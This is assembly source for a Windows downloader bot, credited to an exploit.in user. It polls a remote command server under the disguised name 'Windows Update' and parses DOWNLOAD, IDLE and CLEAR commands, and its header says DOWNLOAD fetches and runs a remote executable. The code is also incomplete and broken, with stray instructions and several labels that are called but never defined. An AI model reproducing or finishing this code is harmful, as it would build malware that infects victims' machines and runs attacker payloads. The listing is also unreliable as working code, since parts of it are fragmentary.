include 'win32ax.inc'

;~~~~By Nu11ers3t~~~~;
;~~~~~exploit.in~~~~~;
;~~~~~~Commands~~~~~~;
;!DOWNLOAD:[url]http://mysite.com/file.exe@URLDownloadToFileA[/url]!  - Will download & execute a file from [url]http://mysite.com/file.exe[/url]
;!IDLE:Content1@Content2!
;!CLEAR:Content1@Content2! - set Download flag to zero

section '.code' code readable writeable executable


host	db 'myhost.com',0
mov	byte [eax + 19], 0

push	OpenInet
push	esi
call	[GetProcAddress]

xor	ecx, ecx
push	ecx
push	ecx
push	ecx
push	ecx
push	szName
call	eax
mov	dword [hOpen], eax

push	0
mov	eax, 80000000h
or	eax, 04000000h
push	eax

mov	ebx, dword [ebp + 12]
add	ebx, 1024
push	ebx
call	[lstrlen]
push	eax

push	ebx
sub	ebx, 1024
push	ebx
mov	eax, dword [hOpen]
push	eax

push	OpenURL
push	esi
call	[GetProcAddress]
call	eax
mov	dword [hConnection], eax
test	eax, eax
je	CantConnect
push	ReadInternet
push	esi
call	[GetProcAddress]
mov	ebx, eax

GetFile:
lea	eax, [dwSize]
push	eax
push	512
push	edi
mov	eax, dword [hConnection]
push	eax
call	ebx
mov	eax, dword [dwSize]
cmp	eax, 0
jl	GetFile


CantConnect:
push	CloseInternet
push	esi
call	[GetProcAddress]
mov	esi, eax

mov	eax, dword [hConnection]
push	eax
call	esi

mov	eax, dword [hOpen]
push	eax
call	esi

mov	eax, dword [ebp + 12]
push	MEM_RELEASE
push	0
push	eax
call	[VirtualFree]

mov	esp, ebp
pop	ebp
pop	esi

ret

Exit:

push	0
call	[ExitProcess]

Downloaded    dd 0
formatString  db 'http://%s%s',0
szName	      db 'Windows Update',0
OpenInet      db 'InternetOpenA',0
OpenURL       db 'InternetOpenUrlA',0
ReadInternet  db 'InternetReadFile',0
CloseInternet db 'InternetCloseHandle',0
wininet       db 'wininet.dll',0
open	      db 'open',0

dwSize	dd 0
hOpen	dd 0
hConnection dd 0

start:

call	[GetCommandLineA]
push	eax
push	eax
call	[lstrlen]
pop	ecx
cmp	byte [ecx + eax - 2], '!'
jnz	Install

push	PAGE_READWRITE
push	MEM_COMMIT
push	1024
push	0
call	[VirtualAlloc]
mov	edi, eax

push	Restart
push	dword [fs:0]
mov	[fs:0], esp

GetTask:

call	Connect

mov	eax, edi
cmp	byte [eax], 0
je	GetTask

dec	eax
push	edi

GetEntry:
inc	eax
cmp	byte [eax], '!'
jnz	GetEntry
mov	ecx, eax
dec	ecx
GetEndOfCommand:
inc	ecx
cmp	byte [ecx], ':'
jnz	GetEndOfCommand
push	ecx
mov	byte [ecx], 0
push	eax
mov	ecx, edi
add	ecx, 512
push	ecx
call	[lstrcpy]
pop	ecx
mov	byte [ecx], ':'

mov	edx, ecx
dec	edx
GetEndOfContent:
inc	edx
cmp	byte [edx], '@'
jnz	GetEndOfContent

mov	byte [edx], 0
push	edx

GetTheEnd:
inc	edx
cmp	byte [edx], '!'
jnz	GetTheEnd
mov	byte [edx], 0
pop	esi

inc	ecx
inc	eax
mov	esi, ecx
GetContent2:
inc	esi
cmp	byte [esi], 0
jnz	GetContent2
inc	esi

;esi = Content2
;ecx = Content1
;eax = Command

push	ebp
mov	ebp, esp
sub	esp, 12

mov	dword [ebp - 12], esi; Content2
mov	dword [ebp - 8], ecx; Content1
mov	dword [ebp - 4], eax; Command

push	eax
push	IDLE
call	[lstrcmpA]
je	Next

push	Download
mov	eax, dword [ebp - 4]
push	eax
call	[lstrcmpA]
je	Downloader

push	Clear
mov	eax, dword [ebp - 4]
push	eax
call	[lstrcmpA]
je	cls


Next:
mov	esp, ebp
pop	ebp


push	30000
call	[Sleep]

pop	edi

jmp	GetTask


IDLE	db 'IDLE',0
Download db 'DOWNLOAD',0
Clear db 'CLEAR',0

.end start
